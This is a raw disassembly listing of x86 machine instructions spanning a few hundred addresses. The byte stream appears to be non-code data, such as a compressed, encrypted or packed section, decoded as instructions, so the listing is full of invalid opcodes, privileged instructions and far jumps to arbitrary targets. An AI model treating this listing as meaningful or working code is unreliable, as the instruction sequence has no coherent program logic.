  41fa20:	and    DWORD PTR [edx+0x7890635b],ecx
  41fa26:	jge    0x41fa01
  41fa28:	adc    BYTE PTR [edx-0x40f3a56],cl
  41fa2e:	lods   al,BYTE PTR ds:[esi]
  41fa2f:	fisttp DWORD PTR [edi+0xab907d]
  41fa35:	sahf   
  41fa36:	mov    esp,0x366fcb92
  41fa3b:	xchg   ecx,eax
  41fa3c:	push   esi
  41fa3d:	loopne 0x41fa27
  41fa3f:	rcr    BYTE PTR [ebp-0x73],cl
  41fa42:	ja     0x41faaa
  41fa44:	dec    edx
  41fa45:	pop    ecx
  41fa46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa47:	pop    eax
  41fa48:	mov    esi,0xc700ec31
  41fa4d:	mov    edx,0xcc77cbe1
  41fa52:	push   esp
  41fa53:	pop    ss
  41fa54:	adc    ah,BYTE PTR [ecx+0x15cbb113]
  41fa5a:	mov    al,ah
  41fa5c:	rol    DWORD PTR [ebx+0x1da2e68c],cl
  41fa62:	popa   
  41fa63:	call   0xe97399c0
  41fa68:	or     al,0x6f
  41fa6a:	jl     0x41f9f9
  41fa6c:	sub    al,0x99
  41fa6e:	dec    ebx
  41fa6f:	cmp    BYTE PTR [edx+esi*1],dl
  41fa72:	sbb    BYTE PTR [eax+0x481c9515],dh
  41fa78:	lea    ebx,[edi]
  41fa7a:	rcr    DWORD PTR [edx+ebp*1-0x39],0xe2
  41fa7f:	jmp    0x2d49:0x2652e19c
  41fa86:	or     al,0x56
  41fa88:	aaa    
  41fa89:	fcmovbe st,st(0)
  41fa8b:	xchg   DWORD PTR [ecx+0x10],ebx
  41fa8e:	jbe    0x41fa76
  41fa90:	stc    
  41fa91:	xor    edx,esi
  41fa93:	cmc    
  41fa94:	aas    
  41fa95:	push   ds
  41fa96:	jbe    0x41fb0f
  41fa98:	aad    0x49
  41fa9a:	dec    ebx
  41fa9b:	test   eax,0x16e8e1af
  41faa0:	inc    BYTE PTR [esi-0x46]
  41faa3:	shl    BYTE PTR [edx],0x8a
  41faa6:	add    BYTE PTR [ecx-0x17],bh
  41faa9:	sbb    al,0xc7
  41faab:	aas    
  41faac:	push   ebp
  41faad:	ins    BYTE PTR es:[edi],dx
  41faae:	pusha  
  41faaf:	push   esi
  41fab0:	fbstp  TBYTE PTR [edi-0x6a9c6e4f]
  41fab6:	cmp    BYTE PTR [ecx],ah
  41fab8:	popf   
  41fab9:	mov    bh,0x20
  41fabb:	adc    al,0x36
  41fabd:	ret    
  41fabe:	add    al,0xa5
  41fac0:	scas   al,BYTE PTR es:[edi]
  41fac1:	inc    esp
  41fac2:	jb     0x41fb0f
  41fac4:	aam    0x3c
  41fac6:	cli    
  41fac7:	or     eax,0x8e1f3f3
  41facc:	out    0x38,eax
  41face:	and    BYTE PTR [ebx+edx*2],bl
  41fad1:	adc    eax,0x4210d235
  41fad6:	mov    dh,0x50
  41fad8:	mov    edi,0xe67062de
  41fadd:	add    BYTE PTR gs:[eax],al
	...
  41fae8:	add    BYTE PTR [eax],al
  41faea:	pop    eax
  41faeb:	dec    edx
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	xchg   edx,eax
  41faf7:	jp     0x41faae
  41faf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fafa:	dec    eax
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [esi+eax*1+0x0],bh
  41fb01:	add    BYTE PTR [edx-0x12c0d0ca],bl
  41fb07:	xchg   DWORD PTR [eax-0x13],ebx
  41fb0a:	in     al,0xf2
  41fb0c:	inc    esi
  41fb0d:	or     cl,al
  41fb0f:	out    0xcf,eax
  41fb11:	pop    ecx
  41fb12:	retf   0x7ecd
  41fb15:	jge    0x41facd
  41fb17:	mov    ah,0x90
  41fb19:	sbb    DWORD PTR [edx-0x4c],esi
  41fb1c:	sbb    al,0xa5
  41fb1e:	cmp    ah,dl
  41fb20:	xor    dl,0xdb
  41fb23:	mov    cl,0x4f
  41fb25:	enter  0xbc98,0x1d
  41fb29:	mov    ebp,0x4ecef105
  41fb2e:	sub    al,0xff
  41fb30:	int3   
  41fb31:	shr    DWORD PTR [ecx+0x74cd17cb],1
  41fb37:	lds    ebp,FWORD PTR [edi+0x65]
  41fb3a:	(bad)  
  41fb3b:	sbb    bl,BYTE PTR [ebx-0x37c1c3c8]
  41fb41:	daa    
  41fb42:	iret   
  41fb43:	cmc    
  41fb44:	xchg   esi,eax
  41fb45:	inc    esp
  41fb46:	add    eax,0x5a70cf0d
  41fb4b:	or     eax,0x4ceda902
  41fb50:	das    
  41fb51:	(bad)  
  41fb52:	sbb    al,0xcc
  41fb54:	cmp    ch,BYTE PTR [eax+edx*2]
  41fb57:	popf   
  41fb58:	xchg   dh,dh
  41fb5a:	inc    esp
  41fb5b:	shr    ah,cl
  41fb5d:	pop    esp
  41fb5e:	inc    ebp
  41fb5f:	mov    ch,0xf0
  41fb61:	int    0x22
  41fb63:	inc    ebx
  41fb64:	xchg   esi,eax
  41fb65:	loop   0x41fb0f
  41fb67:	enter  0xe234,0x9d
  41fb6b:	jge    0x41fb33
  41fb6d:	mov    edx,?
  41fb6f:	add    bl,ah
  41fb71:	(bad)  
  41fb73:	mov    DWORD PTR [ebx+0x2dabf59f],0x7675bbec
  41fb7d:	sbb    DWORD PTR [ecx],eax
  41fb7f:	adc    edx,DWORD PTR [edi]
  41fb81:	xor    BYTE PTR [edi-0x3c1c9aa8],bh
  41fb87:	and    edi,DWORD PTR [ebx+ebp*8-0x3e26a5bb]
  41fb8e:	add    al,0xa9
  41fb90:	jmp    0x5d11:0x69d3bc1f
  41fb97:	lods   al,BYTE PTR ds:[esi]
  41fb98:	enter  0xbb41,0x3b
  41fb9c:	addr16 pop ebx
  41fb9e:	xchg   ebx,eax
  41fb9f:	push   ecx
  41fba0:	push   ss
  41fba1:	mov    esp,DWORD PTR [edi-0x3b]
  41fba4:	in     al,dx
  41fba5:	xlat   BYTE PTR ds:[ebx]
  41fba6:	or     al,0x70
  41fba8:	xor    al,BYTE PTR [esi+0x605d5bc6]
  41fbae:	sahf   
  41fbaf:	inc    ebx
  41fbb0:	dec    ebp
  41fbb1:	nop
  41fbb2:	and    ecx,DWORD PTR [eax-0x52]
  41fbb5:	bound  ecx,QWORD PTR [ebp+0x78]
  41fbb8:	mov    eax,edi
  41fbba:	ins    DWORD PTR es:[edi],dx
  41fbbb:	cmp    DWORD PTR [edi],0x22
  41fbbe:	mov    edi,0x2d3cb782
  41fbc3:	sub    BYTE PTR [eax-0x7b97bd71],ah
  41fbc9:	or     al,0x72
  41fbcb:	pop    edx
  41fbcc:	lods   al,BYTE PTR ds:[esi]
  41fbcd:	or     ch,cl
  41fbcf:	inc    esp
  41fbd0:	push   esp
  41fbd1:	cli    
  41fbd2:	push   ds
  41fbd3:	push   ebp
  41fbd4:	das    
  41fbd5:	das    
  41fbd6:	mov    eax,ds:0xb55b4f23
  41fbdb:	cld    
  41fbdc:	mov    cl,0x7a
  41fbde:	mov    eax,0xeb351e9e
  41fbe3:	jae    0x41fb97
  41fbe5:	nop
  41fbe6:	mov    bl,0xfa
  41fbe8:	inc    esp
  41fbe9:	fcom   QWORD PTR [edx-0x7]
  41fbec:	jae    0x41fc45
  41fbee:	inc    edx
  41fbef:	sub    DWORD PTR cs:[ecx+0x2f],esi
  41fbf3:	pop    ds
  41fbf4:	fbstp  TBYTE PTR [ebx+0x6aa26833]
  41fbfa:	mov    dh,0x56
  41fbfc:	fld    st(3)
  41fbfe:	xor    eax,0x8478949f
  41fc03:	dec    edi
  41fc04:	xchg   ecx,eax
  41fc05:	xor    ebx,DWORD PTR [ecx-0x56]
  41fc08:	addr16 in eax,0xf1
  41fc0b:	push   esp
  41fc0c:	push   edi
  41fc0d:	nop
  41fc0e:	test   DWORD PTR [eax-0x1c3d6b23],edi
  41fc14:	cwde   
  41fc15:	add    BYTE PTR [edi+0x609ae181],bl
  41fc1b:	dec    ecx
  41fc1c:	scas   eax,DWORD PTR es:[edi]
  41fc1d:	xor    BYTE PTR [ebx],ch
  41fc1f:	push   eax
  41fc20:	mov    eax,0x9d489657
  41fc25:	cs scas al,BYTE PTR es:[edi]
  41fc27:	shr    BYTE PTR [esi],1
  41fc29:	into   
  41fc2a:	or     ecx,ecx
  41fc2c:	test   ecx,0xdefe9938
  41fc32:	dec    ecx
  41fc33:	pushf  
  41fc34:	sahf   
  41fc35:	push   0xde98b0e7
  41fc3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc3b:	leave  
  41fc3c:	in     eax,dx
  41fc3d:	(bad)  [ecx+0x6c4a5e62]
  41fc43:	pop    esp
  41fc44:	rsm    
  41fc46:	ins    BYTE PTR es:[edi],dx
  41fc47:	mov    edi,0xe57497b4
  41fc4c:	pop    eax
  41fc4d:	mov    ebp,0xdfad4601
  41fc52:	pop    ecx
  41fc53:	cli    
  41fc54:	dec    esi
  41fc55:	cli    
  41fc56:	jne    0x41fc4d
  41fc58:	pop    ss
  41fc59:	outs   dx,DWORD PTR ds:[esi]
  41fc5a:	mov    bl,0x10
  41fc5c:	xchg   edx,eax
  41fc5d:	xchg   cl,ah
  41fc5f:	dec    ebp
  41fc60:	scas   al,BYTE PTR es:[edi]
  41fc61:	(bad)  
  41fc62:	stos   DWORD PTR es:[edi],eax
  41fc63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc64:	mov    WORD PTR [esi-0x404df426],?
  41fc6a:	and    BYTE PTR [eax+ebp*4-0x62e49b2e],al
  41fc71:	out    dx,eax
  41fc72:	call   0x483a:0x56e4f972
  41fc79:	outs   dx,BYTE PTR ds:[esi]
  41fc7a:	rcr    BYTE PTR [eax],0xdd
  41fc7d:	pop    ecx
  41fc7e:	xchg   ebx,eax
  41fc7f:	sar    DWORD PTR [ebp-0x21],cl
  41fc82:	mov    ah,0xc6
  41fc84:	int    0xe2
  41fc86:	inc    ebp
  41fc87:	ins    DWORD PTR es:[edi],dx
  41fc88:	pop    esp
  41fc89:	lea    ecx,[edx+0x2340d4e2]
  41fc8f:	cli    
  41fc90:	ja     0x41fc4d
  41fc92:	out    dx,al
  41fc93:	out    0xda,eax
  41fc95:	inc    ecx
  41fc96:	test   bl,0xb3
  41fc99:	scas   al,BYTE PTR es:[edi]
  41fc9a:	rol    BYTE PTR [ecx],1
  41fc9c:	push   0x7baf5159
  41fca1:	jecxz  0x41fd1c
  41fca3:	push   ebp
  41fca4:	and    DWORD PTR [ebx],0xffffffd3
  41fca7:	add    bl,bh
  41fca9:	add    edi,ecx
  41fcab:	mov    eax,0x7374f8bd
  41fcb0:	test   DWORD PTR [ecx-0x73],eax
  41fcb3:	(bad)
  41fcb6:	outs   dx,BYTE PTR ds:[esi]
  41fcb7:	or     al,0xaf
  41fcb9:	pop    edi
  41fcba:	sbb    dl,ch
  41fcbc:	stc    
  41fcbd:	sysexit 
  41fcbf:	jnp    0x41fcda
  41fcc1:	in     al,0x83
  41fcc3:	push   0xb
  41fcc5:	ds or  esi,edx
  41fcc8:	test   esp,ecx
  41fcca:	push   ecx
  41fccb:	ror    edx,cl
  41fccd:	mov    edx,0x89f4ad56
  41fcd2:	dec    ebp
  41fcd3:	jbe    0x41fc5c
  41fcd5:	das    
  41fcd6:	pop    esp
  41fcd7:	dec    esp
  41fcd8:	test   al,0xf3
  41fcda:	and    al,0xf3
  41fcdc:	pop    ds
  41fcdd:	push   ss
  41fcde:	sbb    eax,DWORD PTR [eax-0x23]
  41fce1:	mov    DWORD PTR ds:[ebx-0x1e3780ad],ebx
  41fce8:	retf   
  41fce9:	fdivp  st(3),st
  41fceb:	dec    edx
  41fcec:	test   ah,ah
  41fcee:	push   ds
  41fcef:	jmp    0xfa1ac31f
  41fcf4:	mov    ebp,0x4a08492d
  41fcf9:	popa   
  41fcfa:	add    eax,0xbb7187b2
  41fcff:	adc    eax,0x969f7c88
  41fd04:	sbb    eax,0x9c6aeaa
  41fd09:	pop    eax
  41fd0a:	sub    edx,DWORD PTR [ebp+0x58]
  41fd0d:	mov    al,ds:0xcde57479
  41fd12:	iret   
  41fd13:	pop    ss
  41fd14:	js     0x41fd1f
  41fd16:	shl    BYTE PTR [esi+0x5d],cl
  41fd19:	jne    0x41fd6d
  41fd1b:	sub    bl,al
  41fd1d:	int    0x71
  41fd1f:	adc    ecx,DWORD PTR [ebp-0x58a06284]
  41fd25:	mov    esp,0x5100718d
  41fd2a:	pop    ds
  41fd2b:	add    eax,0x143598ab
  41fd30:	push   ebp
  41fd31:	xchg   esp,eax
  41fd32:	shr    edx,cl
  41fd34:	push   ecx
  41fd35:	ror    esp,1
  41fd37:	mov    ds:0xd01c9168,al
  41fd3c:	inc    ebp
  41fd3d:	retf   0xbb73
  41fd40:	mov    edx,?
  41fd42:	ins    DWORD PTR es:[edi],dx
  41fd43:	push   ds
  41fd44:	xchg   ebp,eax
  41fd45:	fcomp  QWORD PTR [ecx+0x7e]
  41fd48:	mov    al,0x52
  41fd4a:	push   0x3d
  41fd4c:	inc    esi
  41fd4d:	and    cl,bl
  41fd4f:	repnz xchg esp,eax
  41fd51:	shr    BYTE PTR [edi],0xed
  41fd54:	adc    BYTE PTR [edi+0x7],0x6e
  41fd58:	adc    al,0x4e
  41fd5a:	inc    esi
  41fd5b:	pop    edi
  41fd5c:	lea    esp,[edx+edx*2-0x663da389]
  41fd63:	dec    eax
  41fd64:	mov    esi,0xd88ab334
  41fd69:	mov    ecx,0xa22ac081
  41fd6e:	xlat   BYTE PTR ds:[ebx]
  41fd6f:	loope  0x41fdcf
  41fd71:	das    
  41fd72:	jmp    0x41fd37
  41fd74:	lods   eax,DWORD PTR ds:[esi]
  41fd75:	or     DWORD PTR [ecx+edi*2+0x5d],ebx
  41fd79:	sbb    esi,0xc3c51cad
  41fd7f:	mov    ebx,0xe7d8f5d9
  41fd84:	jg     0x41fd5f
  41fd86:	stos   BYTE PTR es:[edi],al
  41fd87:	aam    0x51
  41fd89:	jns    0x41fd73
  41fd8b:	mov    ebx,0x3ae8eca7
  41fd90:	lods   ax,WORD PTR ds:[esi]
  41fd92:	dec    ebp
  41fd93:	cmc    
  41fd94:	dec    eax
  41fd95:	out    dx,eax
  41fd96:	repz adc BYTE PTR [eax],dl
  41fd99:	adc    al,0xfc
  41fd9b:	lahf   
  41fd9c:	rcr    BYTE PTR [ebx],cl
  41fd9e:	add    eax,0x34587442
  41fda3:	sbb    edi,edi
  41fda5:	jb     0x41fd8f
  41fda7:	jp     0x41fd74
  41fda9:	div    BYTE PTR [esi+0x62f9c93b]
  41fdaf:	push   ds
  41fdb0:	pop    es
  41fdb1:	test   eax,0x2f7f38ce
  41fdb6:	and    esi,DWORD PTR [esi]
  41fdb8:	mov    ebp,DWORD PTR [ebp-0x75]
  41fdbb:	popf   
  41fdbc:	jp     0x41fe25
  41fdbe:	push   ss
  41fdbf:	popa   
  41fdc0:	xchg   ebp,eax
  41fdc1:	lahf   
  41fdc2:	test   eax,0x5b2b666
  41fdc7:	call   0x3800:0xde6ae931
  41fdce:	fdivr  st,st(3)
  41fdd0:	dec    edi
  41fdd1:	sub    al,0x9d
  41fdd3:	dec    ecx
  41fdd4:	xlat   BYTE PTR ds:[ebx]
  41fdd5:	retf   
  41fdd6:	adc    DWORD PTR [ebx-0x636faa24],ebx
  41fddc:	lds    esi,FWORD PTR [ebp-0x66f5e58b]
  41fde2:	std    
  41fde3:	shr    edx,cl
  41fde5:	cmp    BYTE PTR [esi+0x37dd48ee],0x70
  41fdec:	add    DWORD PTR [ebp+0x5b],esi
  41fdef:	fisub  WORD PTR [ecx+0x11]
  41fdf2:	nop
  41fdf3:	or     eax,0xd5785af1
  41fdf8:	adc    DWORD PTR ds:[ecx-0x4a],edx
  41fdfc:	adc    al,0xa7
  41fdfe:	mov    ch,0xa2
  41fe00:	rcl    BYTE PTR [ecx-0x58d5ff31],0x8
  41fe07:	sbb    BYTE PTR [edi],dh
  41fe09:	sub    DWORD PTR [ecx+0x8e49d17],ebx
  41fe0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe10:	es lahf 
  41fe12:	add    esp,ebx
  41fe14:	xchg   edi,eax
  41fe15:	leave  
  41fe16:	pop    esp
  41fe17:	push   cs
  41fe18:	imul   edi,DWORD PTR [ebx+edx*1],0x7e
  41fe1c:	xor    DWORD PTR [ebx],0x44fcf612
  41fe22:	and    DWORD PTR ds:0xdf8c5e06,eax
  41fe28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe29:	leave  
  41fe2a:	inc    ecx
  41fe2b:	sub    edi,DWORD PTR [ecx-0x39]
  41fe2e:	ret    0x895b
  41fe31:	test   BYTE PTR [esi],bh
  41fe33:	push   ss
  41fe34:	sbb    DWORD PTR [ecx+0x63],ecx
  41fe37:	pop    es
  41fe38:	mov    dl,0x57
  41fe3a:	xor    esp,DWORD PTR [ebp+0x70]
  41fe3d:	cs or  eax,0xeb8bb7ee
  41fe43:	inc    edx
  41fe44:	lahf   
  41fe45:	xchg   ecx,eax
  41fe46:	loopne 0x41fe22
  41fe48:	mov    ecx,DWORD PTR [edi]
  41fe4a:	sbb    BYTE PTR [ebx+0x3009bd9b],0x86
  41fe51:	lahf   
  41fe52:	clc    
  41fe53:	cmp    DWORD PTR [ecx-0x18bf4ae1],esi
  41fe59:	push   ebp
  41fe5a:	mov    eax,ds:0x173205a6
  41fe5f:	mov    ch,0x5
  41fe61:	sub    al,0xbb
  41fe63:	xchg   esp,eax
  41fe64:	xor    al,BYTE PTR [edx-0x4f]
  41fe67:	call   0x22bf:0x98eab521
  41fe6e:	or     BYTE PTR [eax],bh
  41fe70:	pusha  
  41fe71:	in     al,dx
  41fe72:	ins    BYTE PTR es:[edi],dx
  41fe73:	sub    DWORD PTR [esi+eiz*1+0x160cf107],esp
  41fe7a:	fisttp DWORD PTR [ecx]
  41fe7c:	push   edi
  41fe7d:	dec    edx
  41fe7e:	adc    ecx,ebp
  41fe80:	jle    0x41fe26
  41fe82:	out    0x82,eax
  41fe84:	jp     0x41feef
  41fe86:	pop    ss
  41fe87:	ror    DWORD PTR [ecx],1
  41fe89:	mov    ch,BYTE PTR [ebp+0x171b3908]
  41fe8f:	jecxz  0x41feae
  41fe91:	cmp    bh,BYTE PTR [ebp-0x10c895b6]
  41fe97:	imul   edi,DWORD PTR [esi],0x6e5ca506
  41fe9d:	jmp    0x41fe62
  41fe9f:	fistp  WORD PTR [ebx-0x69]
  41fea2:	adc    eax,0x21d591d3
  41fea7:	outs   dx,DWORD PTR ds:[esi]
  41fea8:	mov    esi,0xa169ec96
  41fead:	out    dx,al
  41feae:	lods   eax,DWORD PTR ds:[si]
  41feb0:	inc    esp
  41feb1:	shl    DWORD PTR [edi-0x80],0x97
  41feb5:	mul    BYTE PTR [esi-0x79]
  41feb8:	xchg   edi,eax
  41feb9:	in     al,0x86
  41febb:	cmp    al,0x10
  41febd:	dec    esi
  41febe:	into   
  41febf:	popf   
  41fec0:	out    0xf8,eax
  41fec2:	jns    0x41ff1f
  41fec4:	iret   
  41fec5:	inc    edi
  41fec6:	fdiv   DWORD PTR [eax-0x48]
  41fec9:	test   al,0x3d
  41fecb:	outs   dx,DWORD PTR ds:[esi]
  41fecc:	repnz adc DWORD PTR [esi+eiz*1-0x8391292],esi
  41fed4:	test   al,0xe4
  41fed6:	pop    ds
  41fed7:	mov    ch,BYTE PTR [eax+ebx*8]
  41feda:	jge    0x41ff49
  41fedc:	outs   dx,DWORD PTR ds:[esi]
  41fedd:	stos   BYTE PTR es:[edi],al
  41fede:	int3   
  41fedf:	aad    0x77
  41fee1:	or     eax,0xa0ed9a54
  41fee6:	shl    DWORD PTR [edi],0x81
  41fee9:	cmp    DWORD PTR [edx+0xd04746c],esi
  41feef:	lahf   
  41fef0:	stos   DWORD PTR es:[edi],eax
  41fef1:	push   esp
  41fef2:	imul   ebx,DWORD PTR [edi+0x60],0xa5513db7
  41fef9:	cmp    DWORD PTR [eax-0x4a],ebx
  41fefc:	inc    esp
  41fefd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fefe:	retf   
  41feff:	push   ebp
  41ff00:	js     0x41fefb
  41ff02:	dec    ebp
  41ff03:	rol    BYTE PTR [ebp+0x6f9c2a31],cl
  41ff09:	retf   
  41ff0a:	(bad)  ds:0x82d7d90e
  41ff10:	sar    bl,cl
  41ff12:	loopne 0x41ff25
  41ff14:	pushf  
  41ff15:	popa   
  41ff16:	lds    ecx,FWORD PTR [edx+esi*1]
  41ff19:	out    dx,al
  41ff1a:	pusha  
  41ff1b:	push   ebx
  41ff1c:	lods   al,BYTE PTR ds:[esi]
  41ff1d:	add    al,0xde
  41ff1f:	aam    0x66
  41ff21:	dec    esp
  41ff22:	sbb    eax,0x5025b405
  41ff27:	and    ch,ah
  41ff29:	scas   eax,DWORD PTR es:[edi]
  41ff2a:	push   cs
  41ff2b:	mov    eax,ds:0x4ab655a4
  41ff30:	xor    ebx,DWORD PTR [ecx+0x52fde350]
  41ff36:	cmp    DWORD PTR [esi-0x690e6d67],esp
  41ff3c:	mov    edx,0xa234c6e1
  41ff41:	(bad)  
  41ff42:	adc    al,0xa9
  41ff44:	push   edx
  41ff45:	sbb    eax,0x83049ef2
  41ff4a:	push   esi
  41ff4b:	clc    
  41ff4c:	xchg   esi,eax
  41ff4d:	fild   QWORD PTR [eax-0x59]
  41ff50:	jmp    0x41fed7
  41ff52:	nop
  41ff53:	sub    eax,0x2a80509
  41ff58:	xor    dl,al
  41ff5a:	push   cs
  41ff5b:	xor    eax,0xc826fc7a
  41ff60:	test   eax,0x8ce53c61
  41ff65:	inc    eax
  41ff66:	leave  
  41ff67:	into   
  41ff68:	xchg   esi,eax
  41ff69:	stos   BYTE PTR es:[edi],al
  41ff6a:	scas   eax,DWORD PTR es:[edi]
  41ff6b:	cli    
  41ff6c:	pop    ebp
  41ff6d:	pop    eax
  41ff6e:	jnp    0x41ff81
  41ff70:	popa   
  41ff71:	fld    QWORD PTR [eax]
  41ff73:	or     dh,al
  41ff75:	jge    0x41ff17
  41ff77:	and    eax,0xc4d6e070
  41ff7c:	leave  
  41ff7d:	inc    esp
  41ff7e:	sti    
  41ff7f:	push   cs
  41ff80:	xor    al,0xe9
  41ff82:	jbe    0x41ffb0
  41ff84:	inc    eax
  41ff85:	fistp  QWORD PTR [esi+0x54]
  41ff88:	test   dh,dh
  41ff8a:	mov    ah,0x4c
  41ff8c:	xor    al,0x83
  41ff8e:	fsub   st(2),st
  41ff90:	sub    eax,0xb63851e9
  41ff95:	loop   0x41ffed
  41ff97:	jno    0x41ff28
  41ff99:	mov    dl,0x55
  41ff9b:	test   dh,ah
  41ff9d:	arpl   bx,bx
  41ff9f:	test   BYTE PTR [edx+0x7bfbccc8],bh
  41ffa5:	xchg   esi,eax
  41ffa6:	jae    0x41ff46
  41ffa8:	scas   al,BYTE PTR es:[edi]
  41ffa9:	pop    ds
  41ffaa:	adc    DWORD PTR [ebp+0x1e],ebx
  41ffad:	cdq    
  41ffae:	push   ebp
  41ffaf:	loopne 0x420029
  41ffb1:	cmp    BYTE PTR [ecx+0x7160c356],0xc
  41ffb8:	cmp    BYTE PTR [ebx+0x76],bl
  41ffbb:	push   ebx
  41ffbc:	fcom   DWORD PTR [ebx+0x2374c280]
  41ffc2:	push   cs
  41ffc3:	sub    BYTE PTR [ecx+0x749b84f6],0x7f
  41ffca:	ds lock in eax,dx
  41ffcd:	push   0xffffff85
  41ffcf:	rcr    ch,1
  41ffd1:	out    dx,eax
  41ffd2:	xchg   esi,eax
  41ffd3:	ja     0x420043
  41ffd5:	ret    0x1caa
  41ffd8:	pop    ebp
  41ffd9:	push   edi
  41ffda:	es sub al,0x6b
  41ffdd:	scas   eax,DWORD PTR es:[edi]
  41ffde:	jmp    0x41ffd1
  41ffe0:	push   ecx
  41ffe1:	in     al,dx
  41ffe2:	pop    esi
  41ffe3:	adc    eax,esp
  41ffe5:	inc    ebx
  41ffe6:	fidivr WORD PTR [ebp-0xc2671f4]
  41ffec:	pusha  
  41ffed:	ins    DWORD PTR es:[edi],dx
  41ffee:	inc    BYTE PTR [ebx-0x27]
  41fff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fff2:	and    ebx,eax
  41fff4:	lds    esi,FWORD PTR [esi-0x529effe4]
  41fffa:	loope  0x420077
  41fffc:	(bad)  
  41fffd:	test   BYTE PTR [esi],0x37
  420000:	push   ds
  420001:	maskmovq mm1,mm4
  420004:	es push edx
  420006:	ror    esi,0x1d
  420009:	and    al,0x22
  42000b:	mov    cl,0x7b
  42000d:	stos   DWORD PTR es:[edi],eax
  42000e:	sub    BYTE PTR [esi+0x23],bh
  420011:	dec    edi
  420012:	leave  
  420013:	in     al,dx
  420014:	sbb    DWORD PTR [esi+ebx*2-0x1180c9f2],edi
  42001b:	mov    WORD PTR [esi-0x21],?
  42001e:	inc    edi
  42001f:	repz shl DWORD PTR [eax-0x25],cl
  420023:	push   ds
  420024:	adc    esi,DWORD PTR [ebx]
  420026:	jecxz  0x42006d
  420028:	mov    WORD PTR [ebx-0x2d5a0c0],?
  42002e:	mov    ecx,0xd04c3fab
  420033:	mov    ebx,0xca3643b3
  420038:	(bad)  
  420039:	std    
  42003a:	outs   dx,BYTE PTR ds:[esi]
  42003b:	cdq    
  42003c:	jg     0x42004a
  42003e:	loopne 0x420066
  420040:	sub    DWORD PTR [edi+0x38],esp
  420043:	xor    dh,BYTE PTR [ecx-0xb]
  420046:	or     bl,BYTE PTR [esi+0x2232dc6b]
  42004c:	out    dx,eax
  42004d:	mov    BYTE PTR [esi],bl
  42004f:	xchg   BYTE PTR [edx],dl
  420051:	call   0x22c1:0x3e5a03eb
  420058:	pop    esp
  420059:	imul   DWORD PTR [ebx+0x1]
  42005c:	aad    0x35
  42005e:	in     eax,dx
  42005f:	xchg   BYTE PTR [eiz*8-0x1dd23c0d],bh
  420066:	retf   0x5cea
  420069:	fsub   QWORD PTR [eax-0x224b4fa9]
  42006f:	mov    BYTE PTR [ebp-0x9],bl
  420072:	aam    0x3b
  420074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420075:	push   ebx
  420076:	sbb    ecx,DWORD PTR [ebx]
  420078:	xchg   edi,eax
  420079:	pop    edi
  42007a:	push   ds
  42007b:	and    eax,0x3ea2c671
  420080:	out    dx,eax
  420081:	pop    ecx
  420082:	fmul   DWORD PTR [ebx+0x37bac6d4]
  420088:	mov    ecx,DWORD PTR [edi+eiz*2-0x6e]
  42008c:	sbb    DWORD PTR [esi],edi
  42008e:	clc    
  42008f:	imul   BYTE PTR [edi+0x3b1f00c0]
  420095:	addr16 mov ds:0x69d1,al
  420099:	das    
  42009a:	pop    ss
  42009b:	sbb    al,0x90
  42009d:	jno    0x420112
  42009f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200a0:	xchg   edx,eax
  4200a1:	ds adc eax,0x81561305
  4200a7:	dec    ecx
  4200a8:	inc    esi
  4200a9:	mov    ds:0xb6d6b0cb,eax
  4200ae:	repz int 0x4e
  4200b1:	jmp    0x420091
  4200b3:	imul   ebx,DWORD PTR [ecx],0xfac71fd6
  4200b9:	in     eax,0x22
  4200bb:	iret   
  4200bc:	sbb    eax,0x74a4eefb
  4200c1:	sbb    ebp,DWORD PTR [bx-0x59c4]
  4200c6:	clc    
  4200c7:	in     eax,0x56
  4200c9:	cli    
  4200ca:	mov    WORD PTR [eax-0x3d],?
  4200cd:	add    esp,DWORD PTR [ebx]
  4200cf:	jmp    0x63ab7f98
  4200d4:	pusha  
  4200d5:	sub    edx,edx
  4200d7:	ret    
  4200d8:	push   ebx
  4200d9:	pop    ds
  4200da:	jns    0x420062
  4200dc:	dec    ebx
  4200dd:	cmp    al,dl
  4200df:	pop    ds
  4200e0:	(bad)  
  4200e1:	xchg   ecx,eax
  4200e2:	(bad)  
  4200e3:	sti    
  4200e4:	sub    dl,BYTE PTR [ebx-0x2e46c547]
  4200ea:	and    dh,BYTE PTR [edx]
  4200ec:	inc    ebx
  4200ed:	inc    edx
  4200ee:	leave  
  4200ef:	sbb    DWORD PTR [ecx+edi*4],esp
  4200f2:	in     al,dx
  4200f3:	mov    dl,BYTE PTR [edi]
  4200f5:	test   DWORD PTR [eax+0x75],ebp
  4200f8:	pop    ebp
  4200f9:	sahf   
  4200fa:	adc    DWORD PTR [ecx+0x4f],0xffffff8d
  4200fe:	or     ah,BYTE PTR [eax+0x6b]
  420101:	push   ss
  420102:	mov    ds:0xfd3d8f03,eax
  420107:	bound  esi,QWORD PTR [esi]
  420109:	cmp    al,0xf8
  42010b:	in     al,0x66
  42010d:	xchg   esp,eax
  42010e:	sub    ecx,edx
  420110:	cmp    DWORD PTR [edi-0x6701392e],ecx
  420116:	xor    eax,0x3a5d9113
  42011b:	pop    ecx
  42011c:	sahf   
  42011d:	fxch   st(2)
  42011f:	in     al,0xef
  420121:	fdivr  DWORD PTR [ebx+0x2eb316e7]
  420127:	dec    esp
  420128:	sub    edx,eax
  42012a:	and    esi,eax
  42012c:	lods   al,BYTE PTR ds:[esi]
  42012d:	mov    bl,0x49
  42012f:	out    dx,al
  420130:	loopne 0x42015c
  420132:	jecxz  0x42010a
  420134:	sub    al,0x47
  420136:	adc    bl,bl
  420138:	adc    ch,BYTE PTR [esi+0x5]
  42013b:	sbb    al,BYTE PTR [ebp+0xc3400ef]
  420141:	pushf  
  420142:	popf   
  420143:	gs ffree st(1)
